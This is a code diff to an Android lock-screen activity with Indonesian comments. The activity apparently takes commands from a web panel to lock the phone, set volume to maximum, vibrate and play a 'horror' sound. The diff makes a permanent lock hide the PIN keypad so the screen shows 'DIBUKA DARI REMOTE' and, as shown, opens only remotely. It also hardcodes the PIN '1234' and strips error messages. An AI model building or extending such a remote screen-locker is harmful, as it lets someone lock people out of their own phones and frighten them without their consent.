@@ -12,6 +12,8 @@ import android.os.Bundle;
 import android.os.CountDownTimer;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
+import android.view.View;
+import android.widget.GridLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -22,8 +24,7 @@ public class LockScreenActivity extends Activity {
     private String correctPin = "1234"; 
     private long timerDuration = 0;
     private CountDownTimer countDownTimer;
-    private boolean isLocked = false; 
-    private boolean isGetarActive = false; // Penanda getar aktif
+    private boolean isGetarActive = false; 
     
     private MediaPlayer mediaPlayer;
     private Vibrator vibrator;
@@ -40,11 +41,7 @@ public class LockScreenActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_lock);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            startLockTask(); 
-            isLocked = true;
-        }
-
+        // KIOSK MODE DIMATIKAN AGAR TOMBOL HP BERFUNGSI
         registerReceiver(unlockReceiver, new IntentFilter("UNLOCK_SCREEN_ACTION"));
 
         tvPesan = findViewById(R.id.tv_pesan);
@@ -60,29 +57,23 @@ public class LockScreenActivity extends Activity {
         }
         if (getIntent().hasExtra("TIMER")) timerDuration = getIntent().getLongExtra("TIMER", 0);
 
-        // --- LOGIKA SUARA, GETAR, & VOLUME ---
         String suara = getIntent().getStringExtra("SUARA");
         String getar = getIntent().getStringExtra("GETAR");
         String volume = getIntent().getStringExtra("VOLUME");
 
-        // Cek Volume
-        if ("1".equals(volume)) {
-            setVolumeMax();
-        }
+        if ("1".equals(volume)) setVolumeMax();
+        if ("1".equals(getar)) { isGetarActive = true; getarSekali(); }
+        if (suara != null && suara.equals("horor")) putarSuaraHoror();
 
-        // Cek Getar
-        if ("1".equals(getar)) {
-            isGetarActive = true;
-            getarSekali();
+        // JIKA PERMANEN (TIMER 0), SEMBUNYIIN KEYPAD & PIN
+        if (timerDuration == 0) {
+            tvPinDisplay.setVisibility(View.GONE);
+            findViewById(R.id.keypad).setVisibility(View.GONE);
+            tvTimer.setText("DIBUKA DARI REMOTE");
+        } else {
+            setupKeypad();
+            startTimer();
         }
-
-        // Cek Suara
-        if (suara != null && suara.equals("horor")) {
-            putarSuaraHoror();
-        }
-
-        setupKeypad();
-        startTimer();
     }
 
     private void setVolumeMax() {
@@ -90,9 +81,6 @@ public class LockScreenActivity extends Activity {
             AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
             if (audioManager != null) {
                 audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
-                audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, audioManager.getStreamMaxVolume(AudioManager.STREAM_SYSTEM), 0);
-                audioManager.setStreamVolume(AudioManager.STREAM_RING, audioManager.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
-                audioManager.setStreamVolume(AudioManager.STREAM_ALARM, audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
             }
         } catch (Exception e) { }
     }
@@ -100,13 +88,8 @@ public class LockScreenActivity extends Activity {
     private void putarSuaraHoror() {
         try {
             mediaPlayer = MediaPlayer.create(this, R.raw.suara_horor);
-            if (mediaPlayer != null) {
-                mediaPlayer.setLooping(false);
-                mediaPlayer.start();
-            }
-        } catch (Exception e) {
-            Toast.makeText(this, "File suara tidak ditemukan!", Toast.LENGTH_SHORT).show();
-        }
+            if (mediaPlayer != null) { mediaPlayer.setLooping(false); mediaPlayer.start(); }
+        } catch (Exception e) { }
     }
 
     private void getarSekali() {
@@ -119,15 +102,6 @@ public class LockScreenActivity extends Activity {
                 }
             }
         } catch (Exception e) { }
-    }
-
-    @Override
-    protected void onNewIntent(Intent intent) {
-        super.onNewIntent(intent);
-        setIntent(intent);
-        if (intent.hasExtra("ACTION") && "FINISH".equals(intent.getStringExtra("ACTION"))) {
-            unlockScreen();
-        }
     }
 
     private void setupKeypad() {
@@ -159,11 +133,9 @@ public class LockScreenActivity extends Activity {
     private void checkPin() {
         if (inputPin.length() == correctPin.length()) {
             if (inputPin.toString().equals(correctPin)) {
-                Toast.makeText(this, "PIN BENAR!", Toast.LENGTH_SHORT).show();
                 unlockScreen();
             } else {
-                Toast.makeText(this, "PIN SALAH!", Toast.LENGTH_SHORT).show();
-                if (isGetarActive) getarSekali(); // Getar cuma jalan kalau di-set dari Web
+                if (isGetarActive) getarSekali(); 
                 inputPin.setLength(0);
                 updatePinDisplay();
             }
@@ -171,45 +143,23 @@ public class LockScreenActivity extends Activity {
     }
 
     private void startTimer() {
-        if (timerDuration > 0) {
-            countDownTimer = new CountDownTimer(timerDuration * 1000, 1000) {
-                @Override
-                public void onTick(long millisUntilFinished) {
-                    long hours = millisUntilFinished / 3600000;
-                    long minutes = (millisUntilFinished % 3600000) / 60000;
-                    long seconds = (millisUntilFinished % 60000) / 1000;
-                    tvTimer.setText(String.format("DIBUKA DALAM : %02d:%02d:%02d", hours, minutes, seconds));
-                }
-                @Override
-                public void onFinish() { 
-                    unlockScreen(); 
-                }
-            }.start();
-        } else {
-            tvTimer.setText("DIBUKA DALAM : PERMANEN");
-        }
+        countDownTimer = new CountDownTimer(timerDuration * 1000, 1000) {
+            @Override
+            public void onTick(long millisUntilFinished) {
+                long hours = millisUntilFinished / 3600000;
+                long minutes = (millisUntilFinished % 3600000) / 60000;
+                long seconds = (millisUntilFinished % 60000) / 1000;
+                tvTimer.setText(String.format("DIBUKA DALAM : %02d:%02d:%02d", hours, minutes, seconds));
+            }
+            @Override
+            public void onFinish() { unlockScreen(); }
+        }.start();
     }
 
     private void unlockScreen() {
         if (countDownTimer != null) countDownTimer.cancel();
-        
-        if (mediaPlayer != null) {
-            if (mediaPlayer.isPlaying()) {
-                mediaPlayer.stop();
-            }
-            mediaPlayer.release();
-            mediaPlayer = null;
-        }
-
-        try {
-            if (isLocked && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                stopLockTask(); 
-                isLocked = false;
-            }
-            finishAndRemoveTask(); 
-        } catch (Exception e) {
-            finish();
-        }
+        if (mediaPlayer != null) { mediaPlayer.release(); mediaPlayer = null; }
+        finishAndRemoveTask(); 
     }
 
     @Override
@@ -219,10 +169,7 @@ public class LockScreenActivity extends Activity {
     protected void onDestroy() {
         super.onDestroy();
         if (countDownTimer != null) countDownTimer.cancel();
-        if (mediaPlayer != null) {
-            mediaPlayer.release();
-            mediaPlayer = null;
-        }
+        if (mediaPlayer != null) mediaPlayer.release();
         try { unregisterReceiver(unlockReceiver); } catch (Exception e) {}
     }
 }
